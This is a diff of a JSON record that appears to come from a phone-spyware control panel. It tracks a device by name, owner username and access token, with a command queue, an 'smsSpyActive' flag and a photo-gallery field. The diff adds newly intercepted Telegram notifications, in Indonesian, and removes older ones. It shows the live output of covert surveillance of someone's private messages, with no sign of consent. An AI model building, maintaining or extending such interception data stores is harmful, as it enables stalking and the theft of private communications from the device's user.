@@ -3072,7 +3072,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "3b9b91fe42c928810228c2889719201c",
-    "lastSeen": 1776747903693,
+    "lastSeen": 1776747921686,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T04:18:12.057Z",
@@ -3094,6 +3094,38 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 12:05",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776747922553
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 12:05",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776747922504
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 12:05",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776747922453
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16274 pesan baru dari 112 obrolan",
+        "time": "21/04 12:05",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776747922181
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -7061,38 +7093,6 @@
         "time": "21/04 11:34",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776746046759
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 11:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776745989937
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 11:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776745989887
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 11:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776745989827
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 11:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776745989754
       }
     ],
     "galleryPhotos": [
